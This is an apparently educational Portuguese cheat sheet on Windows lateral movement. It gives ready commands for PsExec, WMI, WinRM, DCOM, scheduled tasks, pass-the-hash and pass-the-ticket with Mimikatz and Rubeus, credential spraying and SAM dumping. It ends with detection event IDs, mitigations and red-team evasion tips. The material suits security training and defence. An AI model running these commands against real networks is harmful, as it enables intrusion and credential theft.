# 🔄 Windows Lateral Movement - Teoria Completa

> Guia educacional sobre movimento lateral em redes Windows

---

## 📚 O que é Lateral Movement?

**Lateral Movement** é a técnica de mover-se entre sistemas em uma rede após comprometimento inicial, expandindo acesso e buscando alvos de alto valor.

### Objetivo
```
Após comprometimento inicial:
├─ Expandir acesso para outros sistemas
├─ Buscar credenciais adicionais
├─ Alcançar alvos de alto valor (DCs, servidores críticos)
└─ Evitar detecção mantendo persistência
```

⚠️ **Conteúdo puramente educacional - Use apenas em ambientes autorizados**

---

## 🎯 Pré-requisitos

Para movimento lateral, você precisa de:
```
1. Acesso inicial a um sistema
2. Credenciais válidas OU
3. Hash de credenciais (Pass-the-Hash)
4. Tickets Kerberos (Pass-the-Ticket)
5. Conhecimento da rede
```

---

## 🔐 Técnicas de Movimento Lateral

### 1. PsExec (Sysinternals)

**Conceito:** Executa comandos remotamente via SMB (porta 445)

```powershell
# PsExec original
.\PsExec.exe \\TARGET -u DOMAIN\user -p password cmd

# PsExec com hash (Impacket)
python psexec.py DOMAIN/user@TARGET
python psexec.py -hashes :NTLMHASH DOMAIN/user@TARGET

# Metasploit
use exploit/windows/smb/psexec
set RHOST target_ip
set SMBUser administrator
set SMBPass password
exploit
```

**Artefatos deixados:**
- Service criado (PSEXESVC)
- Event ID 7045 (novo serviço)
- Event ID 4624 Logon Type 3

---

### 2. WMI (Windows Management Instrumentation)

**Conceito:** Execução remota via WMI (porta 135 + dinâmicas)

```powershell
# Comando WMI nativo
wmic /node:TARGET /user:DOMAIN\user /password:password process call create "cmd.exe /c whoami > C:\output.txt"

# PowerShell
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName TARGET -Credential $cred

# Impacket wmiexec
python wmiexec.py DOMAIN/user:password@TARGET
python wmiexec.py -hashes :NTLMHASH DOMAIN/user@TARGET
```

**Vantagens:**
- Não cria serviço
- Mais discreto que PsExec

**Artefatos:**
- Event ID 4624 Logon Type 3
- WMI Event Logs

---

### 3. WinRM (Windows Remote Management)

**Conceito:** PowerShell remoting (porta 5985 HTTP, 5986 HTTPS)

```powershell
# Habilitar WinRM (se necessário)
Enable-PSRemoting -Force

# Executar comando único
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }

# Sessão interativa
Enter-PSSession -ComputerName TARGET -Credential $cred

# Evil-WinRM (Kali)
evil-winrm -i TARGET -u user -p password
evil-winrm -i TARGET -u user -H NTLMHASH
```

**Vantagens:**
- Comunicação criptografada
- Nativo do Windows

---

### 4. RDP (Remote Desktop Protocol)

**Conceito:** Acesso gráfico remoto (porta 3389)

```powershell
# Windows nativo
mstsc.exe

# xfreerdp (Linux)
xfreerdp /u:user /p:password /v:TARGET

# Com Pass-the-Hash (Restricted Admin Mode)
xfreerdp /u:user /pth:NTLMHASH /v:TARGET
```

**Restricted Admin Mode:**
```powershell
# Habilitar (requer admin local)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

**Artefatos:**
- Event ID 4624 Logon Type 10
- Event ID 4778/4779 (session connect/disconnect)

---

### 5. SMB (Server Message Block)

**Conceito:** Acesso a compartilhamentos e execução via SMB

```powershell
# Montar share
net use \\TARGET\C$ /user:DOMAIN\user password

# Copiar arquivo e executar
copy evil.exe \\TARGET\C$\Windows\Temp\
wmic /node:TARGET process call create "C:\Windows\Temp\evil.exe"

# Impacket smbexec
python smbexec.py DOMAIN/user:password@TARGET
```

---

### 6. DCOM (Distributed COM)

**Conceito:** Execução via objetos COM remotos (porta 135)

```powershell
# Usando MMC20.Application
$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")

# Usando ShellWindows
$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET")
$obj = [Activator]::CreateInstance($com)
$obj.item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\windows\system32", $null, 0)
```

---

### 7. Scheduled Tasks

**Conceito:** Criar tarefa agendada remota

```powershell
# schtasks nativo
schtasks /create /tn "MyTask" /tr "C:\evil.exe" /sc once /st 00:00 /S TARGET /U DOMAIN\user /P password

# PowerShell
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c calc.exe"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date)
Register-ScheduledTask -TaskName "MyTask" -Action $action -Trigger $trigger -ComputerName TARGET
```

---

## 🎫 Pass-the-Hash (PtH)

**Conceito:** Autenticar usando hash NTLM sem saber a senha em texto claro

```powershell
# Impacket
python psexec.py -hashes :NTLMHASH DOMAIN/user@TARGET
python wmiexec.py -hashes :NTLMHASH DOMAIN/user@TARGET
python smbexec.py -hashes :NTLMHASH DOMAIN/user@TARGET

# Mimikatz
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:cmd

# Evil-WinRM
evil-winrm -i TARGET -u user -H HASH
```

---

## 🎟️ Pass-the-Ticket (PtT)

**Conceito:** Usar tickets Kerberos roubados

```powershell
# Exportar tickets (Mimikatz)
sekurlsa::tickets /export

# Importar ticket
kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:base64_ticket
```

---

## 🔄 Overpass-the-Hash

**Conceito:** Converter hash NTLM em TGT Kerberos

```powershell
# Mimikatz
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:powershell

# Depois solicitar TGT
klist  # Verificar tickets
```

---

## 🛠️ Ferramentas Essenciais

### Impacket Suite (Python)
```bash
psexec.py      # PsExec-like
smbexec.py     # SMB execution
wmiexec.py     # WMI execution
dcomexec.py    # DCOM execution
atexec.py      # Scheduled tasks
```

### NetExec (ex-CrackMapExec)
```bash
# Spray de credenciais
nxc smb 192.168.1.0/24 -u user -p password

# Executar comando
nxc smb TARGET -u user -p password -x "whoami"

# Pass-the-Hash
nxc smb TARGET -u user -H HASH -x "whoami"

# Dump SAM
nxc smb TARGET -u user -p password --sam
```

### BloodHound
```
Identifica caminhos de movimento lateral:
└─ User → AdminTo → Computer → HasSession → HighValueUser
```

---

## 📊 Comparação de Técnicas

| Técnica | Porta | Stealth | Detecção |
|---------|-------|---------|----------|
| **PsExec** | 445 | Baixo | Event 7045 |
| **WMI** | 135 | Médio | WMI Logs |
| **WinRM** | 5985 | Alto | Menos logs |
| **RDP** | 3389 | Baixo | Event 4624 Type 10 |
| **DCOM** | 135 | Alto | Difícil detectar |

---

## 🚨 Detecção (Blue Team)

### Indicadores de Movimento Lateral

```
Event IDs importantes:
├─ 4624 (Logon) - especialmente Type 3, 10
├─ 4648 (Explicit credentials)
├─ 4672 (Special privileges)
├─ 7045 (Service installation)
├─ 4698 (Scheduled task created)
└─ Sysmon Event 3 (Network connections)
```

### Anomalias Comuns
```
Red Flags:
├─ Logon de admin em workstations
├─ Múltiplos logons de mesma conta em curto período
├─ Uso de pass-the-hash (Logon Type 3 sem Type 2 anterior)
├─ Conexões SMB/WMI de workstation para workstation
└─ Processos suspeitos (psexec, wmi, powershell remoto)
```

---

## 🛡️ Mitigação

### Defesas Técnicas
```
1. Credential Guard
   └─ Protege credenciais em memória

2. Restricted Admin Mode
   └─ RDP sem deixar credenciais no destino

3. Local Admin Password Solution (LAPS)
   └─ Senhas únicas de admin local

4. Tiered Administration
   └─ Separação de privilégios por tier

5. Application Whitelisting
   └─ Previne execução não autorizada

6. Desabilitar NTLM
   └─ Forçar uso de Kerberos
```

### Monitora mento
```
1. Sysmon
2. Windows Event Forwarding (WEF)
3. EDR Solutions
4. Network Segmentation
5. Honey Accounts
```

---

## 💡 Dicas para Red Team

```
1. Use técnicas menos barulhentas
   └─ WinRM > PsExec

2. Combine credenciais de múltiplas fontes
   └─ SAM, LSASS, DCSync

3. Evite Domain Admins
   └─ Muito monitorado

4. Use accounts de serviço
   └─ Menos atenção

5. Randomize timing
   └─ Evite padrões detectáveis
```

---

## 📚 Recursos

### Ferramentas
- Impacket
- NetExec (`nxc`)
- BloodHound CE
- Rubeus
- Mimikatz

### Guias
- MITRE ATT&CK - Lateral Movement
- HackTricks - Windows Lateral Movement
- Red Team Notes

### Labs
- HackTheBox - Active machines
- TryHackMe - Lateral Movement rooms
- GOAD (Game of Active Directory)

---

<div align="center">

**🔄 Movimento lateral é a arte de escalar horizontalmente**

*Credenciais → Acesso → Mais Credenciais → Mais Acesso*

---

*Conteúdo educacional | Use apenas em ambientes autorizados*

</div>
